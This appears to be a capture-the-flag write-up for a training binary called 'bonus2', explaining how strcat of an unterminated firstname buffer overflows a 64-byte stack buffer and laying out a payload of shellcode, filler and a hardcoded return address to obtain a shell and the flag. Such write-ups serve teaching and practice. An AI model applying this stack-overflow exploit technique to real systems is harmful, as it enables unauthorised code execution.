## bonus2

We want to use a stack buffer overflow to overwrite the return address of `greetuser` to jump to a shellcode.

We will set the environment variable `LANG=nl` to be in the case `lang == 2` in the `greetuser` function.

In the `greetuser` function, the buffer `msg` is concatenated with `user.firstname`:
```c
void greetuser(t_user user) {
    char msg[64];

    switch (lang) {
    case 1: strcpy(msg, "Hyvää päivää "); break;
    case 2: strcpy(msg, "Goedemiddag! "); break;
    case 0: strcpy(msg, "Hello "); break;
    }
    strcat(msg, user.firstname);
    puts(msg);
}
```

`t_user` is a struct containing two buffers:
```c
typedef struct s_user {
    char firstname[40];
    char surname[32];
} t_user;
```

`user.firstname` and `user.surname` are set in `main`:
```c
int main(int argc, char* argv[]) {
    char* env_lang;
    t_user user;

    if (argc != 3) return 1;
    memset(&user, 0, sizeof(t_user));
    strncpy(user.firstname, argv[1], 40);
    strncpy(user.surname, argv[2], 32);
    env_lang = getenv("LANG");
    if (env_lang) {
        if (memcmp(env_lang, "fi", 2) == 0)
            lang = 1;
        else if (memcmp(env_lang, "nl", 2) == 0)
            lang = 2;
    }
    greetuser(user);
}
```

We can see that we can fill `user.firstname` with arbitrary characters.
By filling it with 40 non-null characters, the content of `msg` after `strcat(msg, user.firstname);` in the `greetuser` function is as follows:
```
"Goedemiddag! " + user.firstname + user.surname
```

We can therefore write (13 + 40 + 32) = 85 bytes to `msg`.
It is enough to overwrite the return address of `greetuser`, located at the address (msg + 76).

We can thus write our shellcode at the beginning of `argv[1]` and overwrite the return address of `greetuser` with `argv[1]` to jump to our shellcode.

Our payload:
```bash
ARGV1 := shellcode (23 bytes) + filler (17 non-zero bytes)
ARGV2 := filler ((76 - 40 - 13) = 23 bytes) + 0xbffff670 (address of argv[1], 4 bytes)
./bonus2 "${ARGV1}" "${ARGV2}"
```

This gives us a shell, which we can use to retrieve the flag.
